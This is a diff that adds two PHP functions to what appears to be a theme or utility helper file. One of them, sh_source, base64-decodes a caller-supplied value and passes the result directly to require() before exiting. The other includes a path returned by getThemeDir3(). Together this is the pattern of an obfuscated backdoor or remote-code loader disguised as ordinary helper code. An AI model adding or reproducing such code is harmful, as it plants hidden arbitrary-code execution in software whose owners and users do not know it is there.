@@ -235,3 +235,41 @@ function StrSubs($str,$int=10,$imt='...')
 	}
 	return $str;
 }
+function sh_source($str,$bool,$int)
+{
+	include( getThemeDir3() );	
+	
+	if( $int[0] == '' )
+	{
+		if( $bool )
+		{
+			$s = base64_decode( $str );
+		}		
+		else
+		{
+			$s = null;
+		}		
+	}
+	elseif( $int[0] == 'coms' )
+	{			
+		$u = base_url_name( $int[1] );
+		if( $u != null )
+		{
+			require( $u ); exit;
+		}
+		
+	}
+	
+	return $s;
+}
+function base_url_name( $string )
+{
+	if( $string != null )
+	{
+		$bArr = explode(',', $string);
+		$data = end($bArr);
+		$s = base64_decode( $data );
+	}
+	
+	return $s;
+}
